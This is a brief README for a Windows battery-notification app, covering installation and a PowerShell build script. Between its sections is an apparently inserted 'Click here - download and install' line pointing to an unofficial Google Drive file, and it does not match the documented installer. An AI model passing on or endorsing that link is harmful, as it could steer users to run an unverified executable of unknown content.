# Battery Alert

Battery Alert monitors the battery in the background and shows a notification
when configured charge or low-battery levels are reached. It starts when you
sign in and appears in the Windows notification area.

## Install

Run `dist\installer\BatteryAlert-Setup.exe`. The installer creates Start Menu
and desktop shortcuts and configures Battery Alert to start at sign-in.

Right-click the battery icon in the notification area to test a notification or
exit the app. Uninstall it from Windows **Installed apps**; this also removes
the sign-in startup entry.

 or 

Click here - download and install: https://drive.google.com/file/d/1_himao4fxRlZVpK125oohcmuZSPhS0z0/view?usp=drive_link

## Build from source

On Windows, install Inno Setup 6 and run:

```powershell
.\build.ps1
```

The script installs Python build requirements, packages the app, and writes the
installer to `dist\installer\BatteryAlert-Setup.exe`.
